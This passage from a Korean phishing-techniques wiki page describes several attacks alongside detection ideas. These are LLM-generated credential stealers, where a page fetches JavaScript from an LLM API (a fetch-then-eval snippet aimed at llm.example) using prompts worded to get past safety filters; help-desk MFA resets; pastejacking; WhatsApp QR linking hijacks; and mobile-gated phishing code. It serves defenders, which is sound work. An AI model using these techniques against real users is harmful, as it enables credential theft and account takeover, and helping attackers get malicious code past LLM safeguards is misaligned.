Attackers는 benign해 보이는 HTML을 전달한 뒤 **trusted LLM API**에 JavaScript를 요청하여 runtime에 stealer를 **generate**하고, 이를 browser에서 실행할 수 있습니다(예: `eval` 또는 dynamic `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** prompt 안에 exfil URL/Base64 string을 encode하고, safety filter를 우회하며 hallucination을 줄이도록 wording을 반복합니다.
2. **Client-side API call:** load 시 JS가 public LLM(Gemini/DeepSeek 등) 또는 CDN proxy를 호출합니다. Static HTML에는 prompt/API call만 존재합니다.
3. **Assemble & exec:** response를 concatenate한 뒤 실행합니다(방문할 때마다 polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 생성된 code가 lure를 개인화하고(예: LogoKit token parsing) creds를 prompt-hidden endpoint로 전송합니다.

**Evasion traits**
- Traffic은 잘 알려진 LLM domains 또는 평판이 좋은 CDN proxies를 거치며, 때로는 backend로 연결되는 WebSockets를 사용합니다.
- Static payload가 없으며, malicious JS는 render 이후에만 존재합니다.
- Non-deterministic generations는 session마다 **고유한 stealer**를 생성합니다.

**Detection ideas**
- JS가 활성화된 sandbox를 실행하고, **LLM responses에서 가져온 runtime `eval`/dynamic script creation**을 탐지합니다.
- LLM APIs로 전송되는 front-end POST 직후 반환된 text에 `eval`/`Function`이 실행되는 패턴을 검색합니다.
- Client traffic에서 승인되지 않은 LLM domains가 나타난 뒤 credential POST가 이어지는 경우 alert를 생성합니다.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
기존의 push-bombing과 더불어, operators는 help-desk call 중에 단순히 **새로운 MFA registration을 강제로 수행**하여 사용자의 기존 token을 무효화합니다. 이후의 모든 login prompt는 victim에게 정상적인 것으로 보입니다.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta 이벤트 중 **`deleteMFA` + `addMFA`**가 동일한 IP에서 **수 분 이내에** 발생하는 경우를 모니터링합니다.



## Clipboard Hijacking / Pastejacking

공격자는 침해되었거나 typosquatting된 웹 페이지를 통해 악성 명령을 피해자의 클립보드에 몰래 복사한 다음, 사용자가 이를 **Win + R**, **Win + X** 또는 터미널 창에 붙여넣도록 유도하여 다운로드나 첨부 파일 없이 임의의 코드를 실행시킬 수 있습니다.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing 및 Malicious App Distribution (Android 및 iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QR social engineering을 통한 WhatsApp device-linking hijack
* 유인 페이지(예: 가짜 정부 기관/CERT “channel”)에 WhatsApp Web/Desktop QR을 표시하고 피해자에게 스캔하도록 안내하여, 공격자를 **linked device**로 몰래 추가합니다.<sup>[[12]](#references)</sup>
* 공격자는 세션이 제거될 때까지 즉시 채팅/연락처를 확인할 수 있습니다. 피해자는 이후 “new device linked” 알림을 볼 수 있으며, 방어자는 신뢰할 수 없는 QR 페이지 방문 직후 발생한 예상치 못한 device-link 이벤트를 hunting할 수 있습니다.

### crawlers/sandboxes를 회피하기 위한 mobile-gated phishing
공격자는 desktop crawler가 최종 페이지에 도달하지 못하도록 간단한 device check를 사용해 phishing flow를 점점 더 자주 제한하고 있습니다. 일반적인 방식은 touch-capable DOM을 확인하고 그 결과를 server endpoint로 전송하는 작은 script를 사용하는 것입니다. non-mobile client에는 HTTP 500(또는 빈 페이지)을 반환하고, mobile user에게는 전체 flow를 제공합니다.<sup>[[7]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` 로직(간소화):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
서버에서 흔히 관찰되는 동작:
- 최초 로드 중 세션 쿠키를 설정합니다.
- `POST /detect {"is_mobile":true|false}`를 허용합니다.
- 이후 GET 요청에서 `is_mobile=false`이면 500(또는 placeholder)을 반환하고, `true`인 경우에만 phishing 페이지를 제공합니다.

탐색 및 탐지 휴리스틱:
- urlscan 쿼리: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → 비모바일 요청에 대한 HTTP 500의 순서; 정상적인 모바일 피해자 경로는 후속 HTML/JS와 함께 200을 반환합니다.
- `ontouchstart` 또는 유사한 device check에만 콘텐츠를 조건부로 제공하는 페이지를 차단하거나 면밀히 조사합니다.

방어 팁:
- mobile과 유사한 fingerprint 및 JS 활성화 상태로 crawler를 실행하여 gated content를 확인합니다.
- 신규 등록 도메인에서 `POST /detect` 이후 의심스러운 500 응답이 발생하면 alert를 생성합니다.

## References

- [1] [Phishing에 사용되는 Domain Variation 생성 (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing 탐지: 도구와 기법 (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC를 사용하여 Credential 탈취 및 2FA 우회 (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC를 사용한 세션 탈취 및 2FA 우회 (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy에서 Postfix와 함께 DKIM 설치 및 구성 방법 (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gated phishing 인프라 및 휴리스틱 (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Runtime Assembly Attack의 새로운 영역: LLM을 활용한 실시간 Phishing JavaScript 생성](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking 및 TDS: Malware Distribution Ecosystem 내부 분석](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com Bitsquatting (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Bitflipping을 통한 Microsoft windows.com 트래픽 Hijacking (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: 파키스탄의 표적 Spyware 캠페인에서 미끼로 사용된 가짜 Dating App](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC 및 샘플](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
